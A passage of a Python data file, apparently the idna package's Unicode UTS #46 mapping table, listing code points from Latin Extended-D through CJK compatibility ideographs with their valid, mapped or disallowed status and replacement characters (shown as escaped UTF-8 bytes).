(0xA7BF, \'V\'),\n    (0xA7C0, \'M\', \'\xea\x9f\x81\'),\n    (0xA7C1, \'V\'),\n    (0xA7C2, \'M\', \'\xea\x9f\x83\'),\n    (0xA7C3, \'V\'),\n    (0xA7C4, \'M\', \'\xea\x9e\x94\'),\n    (0xA7C5, \'M\', \'\xca\x82\'),\n    (0xA7C6, \'M\', \'\xe1\xb6\x8e\'),\n    (0xA7C7, \'M\', \'\xea\x9f\x88\'),\n    (0xA7C8, \'V\'),\n    (0xA7C9, \'M\', \'\xea\x9f\x8a\'),\n    (0xA7CA, \'V\'),\n    (0xA7CB, \'X\'),\n    (0xA7D0, \'M\', \'\xea\x9f\x91\'),\n    (0xA7D1, \'V\'),\n    (0xA7D2, \'X\'),\n    (0xA7D3, \'V\'),\n    (0xA7D4, \'X\'),\n    (0xA7D5, \'V\'),\n    (0xA7D6, \'M\', \'\xea\x9f\x97\'),\n    (0xA7D7, \'V\'),\n    (0xA7D8, \'M\', \'\xea\x9f\x99\'),\n    (0xA7D9, \'V\'),\n    (0xA7DA, \'X\'),\n    (0xA7F2, \'M\', \'c\'),\n    (0xA7F3, \'M\', \'f\'),\n    (0xA7F4, \'M\', \'q\'),\n    (0xA7F5, \'M\', \'\xea\x9f\xb6\'),\n    (0xA7F6, \'V\'),\n    (0xA7F8, \'M\', \'\xc4\xa7\'),\n    (0xA7F9, \'M\', \'\xc5\x93\'),\n    (0xA7FA, \'V\'),\n    (0xA82D, \'X\'),\n    (0xA830, \'V\'),\n    (0xA83A, \'X\'),\n    (0xA840, \'V\'),\n    (0xA878, \'X\'),\n    (0xA880, \'V\'),\n    (0xA8C6, \'X\'),\n    ]\n\ndef _seg_38() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xA8CE, \'V\'),\n    (0xA8DA, \'X\'),\n    (0xA8E0, \'V\'),\n    (0xA954, \'X\'),\n    (0xA95F, \'V\'),\n    (0xA97D, \'X\'),\n    (0xA980, \'V\'),\n    (0xA9CE, \'X\'),\n    (0xA9CF, \'V\'),\n    (0xA9DA, \'X\'),\n    (0xA9DE, \'V\'),\n    (0xA9FF, \'X\'),\n    (0xAA00, \'V\'),\n    (0xAA37, \'X\'),\n    (0xAA40, \'V\'),\n    (0xAA4E, \'X\'),\n    (0xAA50, \'V\'),\n    (0xAA5A, \'X\'),\n    (0xAA5C, \'V\'),\n    (0xAAC3, \'X\'),\n    (0xAADB, \'V\'),\n    (0xAAF7, \'X\'),\n    (0xAB01, \'V\'),\n    (0xAB07, \'X\'),\n    (0xAB09, \'V\'),\n    (0xAB0F, \'X\'),\n    (0xAB11, \'V\'),\n    (0xAB17, \'X\'),\n    (0xAB20, \'V\'),\n    (0xAB27, \'X\'),\n    (0xAB28, \'V\'),\n    (0xAB2F, \'X\'),\n    (0xAB30, \'V\'),\n    (0xAB5C, \'M\', \'\xea\x9c\xa7\'),\n    (0xAB5D, \'M\', \'\xea\xac\xb7\'),\n    (0xAB5E, \'M\', \'\xc9\xab\'),\n    (0xAB5F, \'M\', \'\xea\xad\x92\'),\n    (0xAB60, \'V\'),\n    (0xAB69, \'M\', \'\xca\x8d\'),\n    (0xAB6A, \'V\'),\n    (0xAB6C, \'X\'),\n    (0xAB70, \'M\', \'\xe1\x8e\xa0\'),\n    (0xAB71, \'M\', \'\xe1\x8e\xa1\'),\n    (0xAB72, \'M\', \'\xe1\x8e\xa2\'),\n    (0xAB73, \'M\', \'\xe1\x8e\xa3\'),\n    (0xAB74, \'M\', \'\xe1\x8e\xa4\'),\n    (0xAB75, \'M\', \'\xe1\x8e\xa5\'),\n    (0xAB76, \'M\', \'\xe1\x8e\xa6\'),\n    (0xAB77, \'M\', \'\xe1\x8e\xa7\'),\n    (0xAB78, \'M\', \'\xe1\x8e\xa8\'),\n    (0xAB79, \'M\', \'\xe1\x8e\xa9\'),\n    (0xAB7A, \'M\', \'\xe1\x8e\xaa\'),\n    (0xAB7B, \'M\', \'\xe1\x8e\xab\'),\n    (0xAB7C, \'M\', \'\xe1\x8e\xac\'),\n    (0xAB7D, \'M\', \'\xe1\x8e\xad\'),\n    (0xAB7E, \'M\', \'\xe1\x8e\xae\'),\n    (0xAB7F, \'M\', \'\xe1\x8e\xaf\'),\n    (0xAB80, \'M\', \'\xe1\x8e\xb0\'),\n    (0xAB81, \'M\', \'\xe1\x8e\xb1\'),\n    (0xAB82, \'M\', \'\xe1\x8e\xb2\'),\n    (0xAB83, \'M\', \'\xe1\x8e\xb3\'),\n    (0xAB84, \'M\', \'\xe1\x8e\xb4\'),\n    (0xAB85, \'M\', \'\xe1\x8e\xb5\'),\n    (0xAB86, \'M\', \'\xe1\x8e\xb6\'),\n    (0xAB87, \'M\', \'\xe1\x8e\xb7\'),\n    (0xAB88, \'M\', \'\xe1\x8e\xb8\'),\n    (0xAB89, \'M\', \'\xe1\x8e\xb9\'),\n    (0xAB8A, \'M\', \'\xe1\x8e\xba\'),\n    (0xAB8B, \'M\', \'\xe1\x8e\xbb\'),\n    (0xAB8C, \'M\', \'\xe1\x8e\xbc\'),\n    (0xAB8D, \'M\', \'\xe1\x8e\xbd\'),\n    (0xAB8E, \'M\', \'\xe1\x8e\xbe\'),\n    (0xAB8F, \'M\', \'\xe1\x8e\xbf\'),\n    (0xAB90, \'M\', \'\xe1\x8f\x80\'),\n    (0xAB91, \'M\', \'\xe1\x8f\x81\'),\n    (0xAB92, \'M\', \'\xe1\x8f\x82\'),\n    (0xAB93, \'M\', \'\xe1\x8f\x83\'),\n    (0xAB94, \'M\', \'\xe1\x8f\x84\'),\n    (0xAB95, \'M\', \'\xe1\x8f\x85\'),\n    (0xAB96, \'M\', \'\xe1\x8f\x86\'),\n    (0xAB97, \'M\', \'\xe1\x8f\x87\'),\n    (0xAB98, \'M\', \'\xe1\x8f\x88\'),\n    (0xAB99, \'M\', \'\xe1\x8f\x89\'),\n    (0xAB9A, \'M\', \'\xe1\x8f\x8a\'),\n    (0xAB9B, \'M\', \'\xe1\x8f\x8b\'),\n    (0xAB9C, \'M\', \'\xe1\x8f\x8c\'),\n    (0xAB9D, \'M\', \'\xe1\x8f\x8d\'),\n    (0xAB9E, \'M\', \'\xe1\x8f\x8e\'),\n    (0xAB9F, \'M\', \'\xe1\x8f\x8f\'),\n    (0xABA0, \'M\', \'\xe1\x8f\x90\'),\n    (0xABA1, \'M\', \'\xe1\x8f\x91\'),\n    (0xABA2, \'M\', \'\xe1\x8f\x92\'),\n    (0xABA3, \'M\', \'\xe1\x8f\x93\'),\n    (0xABA4, \'M\', \'\xe1\x8f\x94\'),\n    (0xABA5, \'M\', \'\xe1\x8f\x95\'),\n    (0xABA6, \'M\', \'\xe1\x8f\x96\'),\n    (0xABA7, \'M\', \'\xe1\x8f\x97\'),\n    (0xABA8, \'M\', \'\xe1\x8f\x98\'),\n    (0xABA9, \'M\', \'\xe1\x8f\x99\'),\n    (0xABAA, \'M\', \'\xe1\x8f\x9a\'),\n    ]\n\ndef _seg_39() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xABAB, \'M\', \'\xe1\x8f\x9b\'),\n    (0xABAC, \'M\', \'\xe1\x8f\x9c\'),\n    (0xABAD, \'M\', \'\xe1\x8f\x9d\'),\n    (0xABAE, \'M\', \'\xe1\x8f\x9e\'),\n    (0xABAF, \'M\', \'\xe1\x8f\x9f\'),\n    (0xABB0, \'M\', \'\xe1\x8f\xa0\'),\n    (0xABB1, \'M\', \'\xe1\x8f\xa1\'),\n    (0xABB2, \'M\', \'\xe1\x8f\xa2\'),\n    (0xABB3, \'M\', \'\xe1\x8f\xa3\'),\n    (0xABB4, \'M\', \'\xe1\x8f\xa4\'),\n    (0xABB5, \'M\', \'\xe1\x8f\xa5\'),\n    (0xABB6, \'M\', \'\xe1\x8f\xa6\'),\n    (0xABB7, \'M\', \'\xe1\x8f\xa7\'),\n    (0xABB8, \'M\', \'\xe1\x8f\xa8\'),\n    (0xABB9, \'M\', \'\xe1\x8f\xa9\'),\n    (0xABBA, \'M\', \'\xe1\x8f\xaa\'),\n    (0xABBB, \'M\', \'\xe1\x8f\xab\'),\n    (0xABBC, \'M\', \'\xe1\x8f\xac\'),\n    (0xABBD, \'M\', \'\xe1\x8f\xad\'),\n    (0xABBE, \'M\', \'\xe1\x8f\xae\'),\n    (0xABBF, \'M\', \'\xe1\x8f\xaf\'),\n    (0xABC0, \'V\'),\n    (0xABEE, \'X\'),\n    (0xABF0, \'V\'),\n    (0xABFA, \'X\'),\n    (0xAC00, \'V\'),\n    (0xD7A4, \'X\'),\n    (0xD7B0, \'V\'),\n    (0xD7C7, \'X\'),\n    (0xD7CB, \'V\'),\n    (0xD7FC, \'X\'),\n    (0xF900, \'M\', \'\xe8\xb1\x88\'),\n    (0xF901, \'M\', \'\xe6\x9b\xb4\'),\n    (0xF902, \'M\', \'\xe8\xbb\x8a\'),\n    (0xF903, \'M\', \'\xe8\xb3\x88\'),\n    (0xF904, \'M\', \'\xe6\xbb\x91\'),\n    (0xF905, \'M\', \'\xe4\xb8\xb2\'),\n    (0xF906, \'M\', \'\xe5\x8f\xa5\'),\n    (0xF907, \'M\', \'\xe9\xbe\x9c\'),\n    (0xF909, \'M\', \'\xe5\xa5\x91\'),\n    (0xF90A, \'M\', \'\xe9\x87\x91\'),\n    (0xF90B, \'M\', \'\xe5\x96\x87\'),\n    (0xF90C, \'M\', \'\xe5\xa5\x88\'),\n    (0xF90D, \'M\', \'\xe6\x87\xb6\'),\n    (0xF90E, \'M\', \'\xe7\x99\xa9\'),\n    (0xF90F, \'M\', \'\xe7\xbe\x85\'),\n    (0xF910, \'M\', \'\xe8\x98\xbf\'),\n    (0xF911, \'M\', \'\xe8\x9e\xba\'),\n    (0xF912, \'M\', \'\xe8\xa3\xb8\'),\n    (0xF913, \'M\', \'\xe9\x82\x8f\'),\n    (0xF914, \'M\', \'\xe6\xa8\x82\'),\n    (0xF915, \'M\', \'\xe6\xb4\x9b\'),\n    (0xF916, \'M\', \'\xe7\x83\x99\'),\n    (0xF917, \'M\', \'\xe7\x8f\x9e\'),\n    (0xF918, \'M\', \'\xe8\x90\xbd\'),\n    (0xF919, \'M\', \'\xe9\x85\xaa\'),\n    (0xF91A, \'M\', \'\xe9\xa7\xb1\'),\n    (0xF91B, \'M\', \'\xe4\xba\x82\'),\n    (0xF91C, \'M\', \'\xe5\x8d\xb5\'),\n    (0xF91D, \'M\', \'\xe6\xac\x84\'),\n    (0xF91E, \'M\', \'\xe7\x88\x9b\'),\n    (0xF91F, \'M\', \'\xe8\x98\xad\'),\n    (0xF920, \'M\', \'\xe9\xb8\x9e\'),\n    (0xF921, \'M\', \'\xe5\xb5\x90\'),\n    (0xF922, \'M\', \'\xe6\xbf\xab\'),\n    (0xF923, \'M\', \'\xe8\x97\x8d\'),\n    (0xF924, \'M\', \'\xe8\xa5\xa4\'),\n    (0xF925, \'M\', \'\xe6\x8b\x89\'),\n    (0xF926, \'M\', \'\xe8\x87\x98\'),\n    (0xF927, \'M\', \'\xe8\xa0\x9f\'),\n    (0xF928, \'M\', \'\xe5\xbb\x8a\'),\n    (0xF929, \'M\', \'\xe6\x9c\x97\'),\n    (0xF92A, \'M\', \'\xe6\xb5\xaa\'),\n    (0xF92B, \'M\', \'\xe7\x8b\xbc\'),\n    (0xF92C, \'M\', \'\xe9\x83\x8e\'),\n    (0xF92D, \'M\', \'\xe4\xbe\x86\'),\n    (0xF92E, \'M\', \'\xe5\x86\xb7\'),\n    (0xF92F, \'M\', \'\xe5\x8b\x9e\'),\n    (0xF930, \'M\', \'\xe6\x93\x84\'),\n    (0xF931, \'M\', \'\xe6\xab\x93\'),\n    (0xF932, \'M\', \'\xe7\x88\x90\'),\n    (0xF933, \'M\', \'\xe7\x9b\xa7\'),\n    (0xF934, \'M\', \'\xe8\x80\x81\'),\n    (0xF935, \'M\', \'\xe8\x98\x86\'),\n    (0xF936, \'M\', \'\xe8\x99\x9c\'),\n    (0xF937, \'M\', \'\xe8\xb7\xaf\'),\n    (0xF938, \'M\', \'\xe9\x9c\xb2\'),\n    (0xF939, \'M\', \'\xe9\xad\xaf\'),\n    (0xF93A, \'M\', \'\xe9\xb7\xba\'),\n    (0xF93B, \'M\', \'\xe7\xa2\x8c\'),\n    (0xF93C, \'M\', \'\xe7\xa5\xbf\'),\n    (0xF93D, \'M\', \'\xe7\xb6\xa0\'),\n    (0xF93E, \'M\', \'\xe8\x8f\x89\'),\n    (0xF93F, \'M\', \'\xe9\x8c\x84\'),\n    (0xF940, \'M\', \'\xe9\xb9\xbf\'),\n    (0xF941, \'M\', \'\xe8\xab\x96\'),\n    (0xF942, \'M\', \'\xe5\xa3\x9f\'),\n    (0xF943, \'M\', \'\xe5\xbc\x84\'),\n    (0xF944, \'M\', \'\xe7\xb1\xa0\'),\n    (0xF945, \'M\', \'\xe8\x81\xbe\'),\n    ]\n\ndef _seg_40() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xF946, \'M\', \'\xe7\x89\xa2\'),\n    (0xF947, \'M\', \'\xe7\xa3\x8a\'),\n    (0xF948, \'M\', \'\xe8\xb3\x82\'),\n    (0xF949, \'M\', \'\xe9\x9b\xb7\'),\n    (0xF94A, \'M\', \'\xe5\xa3\x98\'),\n    (0xF94B, \'M\', \'\xe5\xb1\xa2\'),\n    (0xF94C, \'M\', \'\xe6\xa8\x93\'),\n    (0xF94D, \'M\', \'\xe6\xb7\x9a\'),\n    (0xF94E, \'M\', \'\xe6\xbc\x8f\'),\n    (0xF94F, \'M\', \'\xe7\xb4\xaf\'),\n    (0xF950, \'M\', \'\xe7\xb8\xb7\'),\n    (0xF951, \'M\', \'\xe9\x99\x8b\'),\n    (0xF952, \'M\', \'\xe5\x8b\x92\'),\n    (0xF953, \'M\', \'\xe8\x82\x8b\'),\n    (0xF954, \'M\', \'\xe5\x87\x9c\'),\n    (0xF955, \'M\', \'\xe5\x87\x8c\'),\n    (0xF956, \'M\', \'\xe7\xa8\x9c\'),\n    (0xF957, \'M\', \'\xe7\xb6\xbe\'),\n    (0xF958, \'M\', \'\xe8\x8f\xb1\'),\n    (0xF959, \'M\', \'\xe9\x99\xb5\'),\n    (0xF95A, \'M\', \'\xe8\xae\x80\'),\n    (0xF95B, \'M\', \'\xe6\x8b\x8f\'),\n    (0xF95C, \'M\', \'\xe6\xa8\x82\'),\n    (0xF95D, \'M\', \'\xe8\xab\xbe\'),\n    (0xF95E, \'M\', \'\xe4\xb8\xb9\'),\n    (0xF95F, \'M\', \'\xe5\xaf\xa7\'),\n    (0xF960, \'M\', \'\xe6\x80\x92\'),\n    (0xF961, \'M\', \'\xe7\x8e\x87\'),\n    (0xF962, \'M\', \'\xe7\x95\xb0\'),\n    (0xF963, \'M\', \'\xe5\x8c\x97\'),\n    (0xF964, \'M\', \'\xe7\xa3\xbb\'),\n    (0xF965, \'M\', \'\xe4\xbe\xbf\'),\n    (0xF966, \'M\', \'\xe5\xbe\xa9\'),\n    (0xF967, \'M\', \'\xe4\xb8\x8d\'),\n    (0xF968, \'M\', \'\xe6\xb3\x8c\'),\n    (0xF969, \'M\', \'\xe6\x95\xb8\'),\n    (0xF96A, \'M\', \'\xe7\xb4\xa2\'),\n    (0xF96B, \'M\', \'\xe5\x8f\x83\'),\n    (0xF96C, \'M\', \'\xe5\xa1\x9e\'),\n    (0xF96D, \'M\', \'\xe7\x9c\x81\'),\n    (0xF96E, \'M\', \'\xe8\x91\x89\'),\n    (0xF96F, \'M\', \'\xe8\xaa\xaa\'),\n    (0xF970, \'M\', \'\xe6\xae\xba\'),\n    (0xF971, \'M\', \'\xe8\xbe\xb0\'),\n    (0xF972, \'M\', \'\xe6\xb2\x88\'),\n    (0xF973, \'M\', \'\xe6\x8b\xbe\'),\n    (0xF974, \'M\', \'\xe8\x8b\xa5\'),\n    (0xF975, \'M\', \'\xe6\x8e\xa0\'),\n    (0xF976, \'M\', \'\xe7\x95\xa5\'),\n    (0xF977, \'M\', \'\xe4\xba\xae\'),\n    (0xF978, \'M\', \'\xe5\x85\xa9\'),\n    (0xF979, \'M\', \'\xe5\x87\x89\'),\n    (0xF97A, \'M\', \'\xe6\xa2\x81\'),\n    (0xF97B, \'M\', \'\xe7\xb3\xa7\'),\n    (0xF97C, \'M\', \'\xe8\x89\xaf\'),\n    (0xF97D, \'M\', \'\xe8\xab\x92\'),\n    (0xF97E, \'M\', \'\xe9\x87\x8f\'),\n    (0xF97F, \'M\', \'\xe5\x8b\xb5\'),\n    (0xF980, \'M\', \'\xe5\x91\x82\'),\n    (0xF981, \'M\', \'\xe5\xa5\xb3\'),\n    (0xF982, \'M\', \'\xe5\xbb\xac\'),\n    (0xF983, \'M\', \'\xe6\x97\x85\'),\n    (0xF984, \'M\', \'\xe6\xbf\xbe\'),\n    (0xF985, \'M\', \'\xe7\xa4\xaa\'),\n    (0xF986, \'M\', \'\xe9\x96\xad\'),\n    (0xF987, \'M\', \'\xe9\xa9\xaa\'),\n    (0xF988, \'M\', \'\xe9\xba\x97\'),\n    (0xF989, \'M\', \'\xe9\xbb\x8e\'),\n    (0xF98A, \'M\', \'\xe5\x8a\x9b\'),\n    (0xF98B, \'M\', \'\xe6\x9b\x86\'),\n    (0xF98C, \'M\', \'\xe6\xad\xb7\'),\n    (0xF98D, \'M\', \'\xe8\xbd\xa2\'),\n    (0xF98E, \'M\', \'\xe5\xb9\xb4\'),\n    (0xF98F, \'M\', \'\xe6\x86\x90\'),\n    (0xF990, \'M\', \'\xe6\x88\x80\'),\n    (0xF991, \'M\', \'\xe6\x92\x9a\'),\n    (0xF992, \'M\', \'\xe6\xbc\xa3\'),\n    (0xF993, \'M\', \'\xe7\x85\x89\'),\n    (0xF994, \'M\', \'\xe7\x92\x89\'),\n    (0xF995, \'M\', \'\xe7\xa7\x8a\'),\n    (0xF996, \'M\', \'\xe7\xb7\xb4\'),\n    (0xF997, \'M\', \'\xe8\x81\xaf\'),\n    (0xF998, \'M\', \'\xe8\xbc\xa6\'),\n    (0xF999, \'M\', \'\xe8\x93\xae\'),\n    (0xF99A, \'M\', \'\xe9\x80\xa3\'),\n    (0xF99B, \'M\', \'\xe9\x8d\x8a\'),\n    (0xF99C, \'M\', \'\xe5\x88\x97\'),\n    (0xF99D, \'M\', \'\xe5\x8a\xa3\'),\n    (0xF99E, \'M\', \'\xe5\x92\xbd\'),\n    (0xF99F, \'M\', \'\xe7\x83\x88\'),\n    (0xF9A0, \'M\', \'\xe8\xa3\x82\'),\n    (0xF9A1, \'M\', \'\xe8\xaa\xaa\'),\n    (0xF9A2, \'M\', \'\xe5\xbb\x89\'),\n    (0xF9A3, \'M\', \'\xe5\xbf\xb5\'),\n    (0xF9A4, \'M\', \'\xe6\x8d\xbb\'),\n    (0xF9A5, \'M\', \'\xe6\xae\xae\'),\n    (0xF9A6, \'M\', \'\xe7\xb0\xbe\'),\n    (0xF9A7, \'M\', \'\xe7\x8d\xb5\'),\n    (0xF9A8, \'M\', \'\xe4\xbb\xa4\'),\n    (0xF9A9, \'M\', \'\xe5\x9b\xb9\'),\n    ]\n\ndef _seg_41() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xF9AA, \'M\', \'\xe5\xaf\xa7\'),\n    (0xF9AB, \'M\', \'\xe5\xb6\xba\'),\n    (0xF9AC, \'M\', \'\xe6\x80\x9c\'),\n    (0xF9AD, \'M\', \'\xe7\x8e\xb2\'),\n    (0xF9AE, \'M\', \'\xe7\x91\xa9\'),\n    (0xF9AF, \'M\', \'\xe7\xbe\x9a\'),\n    (0xF9B0, \'M\', \'\xe8\x81\x86\'),\n    (0xF9B1, \'M\', \'\xe9\x88\xb4\'),\n    (0xF9B2, \'M\', \'\xe9\x9b\xb6\'),\n    (0xF9B3, \'M\', \'\xe9\x9d\x88\'),\n    (0xF9B4, \'M\', \'\xe9\xa0\x98\'),\n    (0xF9B5, \'M\', \'\xe4\xbe\x8b\'),\n    (0xF9B6, \'M\', \'\xe7\xa6\xae\'),\n    (0xF9B7, \'M\', \'\xe9\x86\xb4\'),\n    (0xF9B8, \'M\', \'\xe9\x9a\xb8\'),\n    (0xF9B9, \'M\', \'\xe6\x83\xa1\'),\n    (0xF9BA, \'M\', \'\xe4\xba\x86\'),\n    (0xF9BB, \'M\', \'\xe5\x83\x9a\'),\n    (0xF9BC, \'M\', \'\xe5\xaf\xae\'),\n    (0xF9BD, \'M\', \'\xe5\xb0\xbf\'),\n    (0xF9BE, \'M\', \'\xe6\x96\x99\'),\n    (0xF9BF, \'M\', \'\xe6\xa8\x82\'),\n    (0xF9C0, \'M\', \'\xe7\x87\x8e\'),\n    (0xF9C1, \'M\', \'\xe7\x99\x82\'),\n    (0xF9C2, \'M\', \'\xe8\x93\xbc\'),\n    (0xF9C3, \'M\', \'\xe9\x81\xbc\'),\n    (0xF9C4, \'M\', \'\xe9\xbe\x8d\'),\n    (0xF9C5, \'M\', \'\xe6\x9a\x88\'),\n    (0xF9C6, \'M\', \'\xe9\x98\xae\'),\n    (0xF9C7, \'M\', \'\xe5\x8a\x89\'),\n    (0xF9C8, \'M\', \'\xe6\x9d\xbb\'),\n    (0xF9C9, \'M\', \'\xe6\x9f\xb3\'),\n    (0xF9CA, \'M\', \'\xe6\xb5\x81\'),\n    (0xF9CB, \'M\', \'\xe6\xba\x9c\'),\n    (0xF9CC, \'M\', \'\xe7\x90\x89\'),\n    (0xF9CD, \'M\', \'\xe7\x95\x99\'),\n    (0xF9CE, \'M\', \'\xe7\xa1\xab\'),\n    (0xF9CF, \'M\', \'\xe7\xb4\x90\'),\n    (0xF9D0, \'M\', \'\xe9\xa1\x9e\'),\n    (0xF9D1, \'M\', \'\xe5\x85\xad\'),\n    (0xF9D2, \'M\', \'\xe6\x88\xae\'),\n    (0xF9D3, \'M\', \'\xe9\x99\xb8\'),\n    (0xF9D4, \'M\', \'\xe5\x80\xab\'),\n    (0xF9D5, \'M\', \'\xe5\xb4\x99\'),\n    (0xF9D6, \'M\', \'\xe6\xb7\xaa\'),\n    (0xF9D7, \'M\', \'\xe8\xbc\xaa\'),\n    (0xF9D8, \'M\', \'\xe5\xbe\x8b\'),\n    (0xF9D9, \'M\', \'\xe6\x85\x84\'),\n    (0xF9DA, \'M\', \'\xe6\xa0\x97\'),\n    (0xF9DB, \'M\', \'\xe7\x8e\x87\'),\n    (0xF9DC, \'M\', \'\xe9\x9a\x86\'),\n    (0xF9DD, \'M\', \'\xe5\x88\xa9\'),\n    (0xF9DE, \'M\', \'\xe5\x90\x8f\'),\n    (0xF9DF, \'M\', \'\xe5\xb1\xa5\'),\n    (0xF9E0, \'M\', \'\xe6\x98\x93\'),\n    (0xF9E1, \'M\', \'\xe6\x9d\x8e\'),\n    (0xF9E2, \'M\', \'\xe6\xa2\xa8\'),\n    (0xF9E3, \'M\', \'\xe6\xb3\xa5\'),\n    (0xF9E4, \'M\', \'\xe7\x90\x86\'),\n    (0xF9E5, \'M\', \'\xe7\x97\xa2\'),\n    (0xF9E6, \'M\', \'\xe7\xbd\xb9\'),\n    (0xF9E7, \'M\', \'\xe8\xa3\x8f\'),\n    (0xF9E8, \'M\', \'\xe8\xa3\xa1\'),\n    (0xF9E9, \'M\', \'\xe9\x87\x8c\'),\n    (0xF9EA, \'M\', \'\xe9\x9b\xa2\'),\n    (0xF9EB, \'M\', \'\xe5\x8c\xbf\'),\n    (0xF9EC, \'M\', \'\xe6\xba\xba\'),\n    (0xF9ED, \'M\', \'\xe5\x90\x9d\'),\n    (0xF9EE, \'M\', \'\xe7\x87\x90\'),\n    (0xF9EF, \'M\', \'\xe7\x92\x98\'),\n    (0xF9F0, \'M\', \'\xe8\x97\xba\'),\n    (0xF9F1, \'M\', \'\xe9\x9a\xa3\'),\n    (0xF9F2, \'M\', \'\xe9\xb1\x97\'),\n    (0xF9F3, \'M\', \'\xe9\xba\x9f\'),\n    (0xF9F4, \'M\', \'\xe6\x9e\x97\'),\n    (0xF9F5, \'M\', \'\xe6\xb7\x8b\'),\n    (0xF9F6, \'M\', \'\xe8\x87\xa8\'),\n    (0xF9F7, \'M\', \'\xe7\xab\x8b\'),\n    (0xF9F8, \'M\', \'\xe7\xac\xa0\'),\n    (0xF9F9, \'M\', \'\xe7\xb2\x92\'),\n    (0xF9FA, \'M\', \'\xe7\x8b\x80\'),\n    (0xF9FB, \'M\', \'\xe7\x82\x99\'),\n    (0xF9FC, \'M\', \'\xe8\xad\x98\'),\n    (0xF9FD, \'M\', \'\xe4\xbb\x80\'),\n    (0xF9FE, \'M\', \'\xe8\x8c\xb6\'),\n    (0xF9FF, \'M\', \'\xe5\x88\xba\'),\n    (0xFA00, \'M\', \'\xe5\x88\x87\'),\n    (0xFA01, \'M\', \'\xe5\xba\xa6\'),\n    (0xFA02, \'M\', \'\xe6\x8b\x93\'),\n    (0xFA03, \'M\', \'\xe7\xb3\x96\'),\n    (0xFA04, \'M\', \'\xe5\xae\x85\'),\n    (0xFA05, \'M\', \'\xe6\xb4\x9e\'),\n    (0xFA06, \'M\', \'\xe6\x9a\xb4\'),\n    (0xFA07, \'M\', \'\xe8\xbc\xbb\'),\n    (0xFA08, \'M\', \'\xe8\xa1\x8c\'),\n    (0xFA09, \'M\', \'\xe9\x99\x8d\'),\n    (0xFA0A, \'M\', \'\xe8\xa6\x8b\'),\n    (0xFA0B, \'M\', \'\xe5\xbb\x93\'),\n    (0xFA0C, \'M\', \'\xe5\x85\x80\'),\n    (0xFA0D, \'M\', \'\xe5\x97\x80\'),\n    ]\n\ndef _seg_42() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFA0E, \'V\'),\n    (0xFA10, \'M\', \'\xe5\xa1\x9a\'),\n    (0xFA11, \'V\'),\n    (0xFA12, \'M\', \'\xe6\x99\xb4\'),\n    (0xFA13, \'V\'),\n    (0xFA15, \'M\', \'\xe5\x87\x9e\'),\n    (0xFA16, \'M\', \'\xe7\x8c\xaa\'),\n    (0xFA17, \'M\', \'\xe7\x9b\x8a\'),\n    (0xFA18, \'M\', \'\xe7\xa4\xbc\'),\n    (0xFA19, \'M\', \'\xe7\xa5\x9e\'),\n    (0xFA1A, \'M\', \'\xe7\xa5\xa5\'),\n    (0xFA1B, \'M\', \'\xe7\xa6\x8f\'),\n    (0xFA1C, \'M\', \'\xe9\x9d\x96\'),\n    (0xFA1D, \'M\', \'\xe7\xb2\xbe\'),\n    (0xFA1E, \'M\', \'\xe7\xbe\xbd\'),\n    (0xFA1F, \'V\'),\n    (0xFA20, \'M\', \'\xe8\x98\x92\'),\n    (0xFA21, \'V\'),\n    (0xFA22, \'M\', \'\xe8\xab\xb8\'),\n    (0xFA23, \'V\'),\n    (0xFA25, \'M\', \'\xe9\x80\xb8\'),\n    (0xFA26, \'M\', \'\xe9\x83\xbd\'),\n    (0xFA27, \'V\'),\n    (0xFA2A, \'M\', \'\xe9\xa3\xaf\'),\n    (0xFA2B, \'M\', \'\xe9\xa3\xbc\'),\n    (0xFA2C, \'M\', \'\xe9\xa4\xa8\'),\n    (0xFA2D, \'M\', \'\xe9\xb6\xb4\'),\n    (0xFA2E, \'M\', \'\xe9\x83\x9e\'),\n    (0xFA2F, \'M\', \'\xe9\x9a\xb7\'),\n    (0xFA30, \'M\', \'\xe4\xbe\xae\'),\n    (0xFA31, \'M\', \'\xe5\x83\xa7\'),\n    (0xFA32, \'M\', \'\xe5\x85\x8d\'),\n    (0xFA33, \'M\', \'\xe5\x8b\x89\'),\n    (0xFA34, \'M\', \'\xe5\x8b\xa4\'),\n    (0xFA35, \'M\', \'\xe5\x8d\x91\'),\n    (0xFA36, \'M\', \'\xe5\x96\x9d\'),\n    (0xFA37, \'M\', \'\xe5\x98\x86\'),\n    (0xFA38, \'M\', \'\xe5\x99\xa8\'),\n    (0xFA39, \'M\', \'\xe5\xa1\x80\'),\n    (0xFA3A, \'M\', \'\xe5\xa2\xa8\'),\n    (0xFA3B, \'M\', \'\xe5\xb1\xa4\'),\n    (0xFA3C, \'M\', \'\xe5\xb1\xae\'),\n    (0xFA3D, \'M\', \'\xe6\x82\x94\'),\n    (0xFA3E, \'M\', \'\xe6\x85\xa8\'),\n    (0xFA3F, \'M\', \'\xe6\x86\x8e\'),\n    (0xFA40, \'M\', \'\xe6\x87\xb2\'),\n    (0xFA41, \'M\', \'\xe6\x95\x8f\'),\n    (0xFA42, \'M\', \'\xe6\x97\xa2\'),\n    (0xFA43, \'M\', \'\xe6\x9a\x91\'),\n    (0xFA44, \'M\', \'\xe6\xa2\x85\'),\n    (0xFA45, \'M\', \'\xe6\xb5\xb7\'),\n    (0xFA46, \'M\', \'\xe6\xb8\x9a\'),\n    (0xFA47, \'M\', \'\xe6\xbc\xa2\'),\n    (0xFA48, \'M\', \'\xe7\x85\xae\'),\n    (0xFA49, \'M\', \'\xe7\x88\xab\'),\n    (0xFA4A, \'M\', \'\xe7\x90\xa2\'),\n    (0xFA4B, \'M\', \'\xe7\xa2\x91\'),\n    (0xFA4C, \'M\', \'\xe7\xa4\xbe\'),\n    (0xFA4D, \'M\', \'\xe7\xa5\x89\'),\n    (0xFA4E, \'M\', \'\xe7\xa5\x88\'),\n    (0xFA4F, \'M\', \'\xe7\xa5\x90\'),\n    (0xFA50, \'M\', \'\xe7\xa5\x96\'),\n    (0xFA51, \'M\', \'\xe7\xa5\x9d\'),\n    (0xFA52, \'M\', \'\xe7\xa6\x8d\'),\n    (0xFA53, \'M\', \'\xe7\xa6\x8e\'),\n    (0xFA54, \'M\', \'\xe7\xa9\x80\'),\n    (0xFA55, \'M\', \'\xe7\xaa\x81\'),\n    (0xFA56, \'M\', \'\xe7\xaf\x80\'),\n    